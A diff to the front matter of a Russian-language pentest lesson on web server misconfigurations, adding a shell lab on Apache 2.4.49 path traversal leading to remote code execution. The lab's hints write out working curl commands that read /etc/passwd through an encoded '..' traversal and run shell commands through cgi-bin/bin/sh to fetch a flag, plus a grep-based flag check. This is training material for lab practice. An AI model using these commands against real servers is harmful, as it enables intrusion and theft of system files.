@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 36
 summary: "Ошибки конфигурации веб-серверов: alias traversal, небезопасные location, листинг каталогов, server-status, известные CVE."
+lab:
+  kind: shell
+  title: "Практика: Apache 2.4.49 traversal → RCE"
+  toolset: [core, curl, whatweb, nuclei]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Начни с версии сервера: `curl -sI https://app.example/`."
+    - "`--path-as-is` обязателен, иначе curl схлопнет `..`; точка кодируется как `.%2e`."
+    - "Сначала прочитай файл вне корня: `curl -s --path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'`."
+    - "Затем RCE через `bin/sh`: `curl -s --path-as-is '.../bin/sh' --data 'echo Content-Type: text/plain; echo; cat /flag.txt' > found.txt`, и `check`."
 ---
 
 ## Вопрос, с которого всё начинается
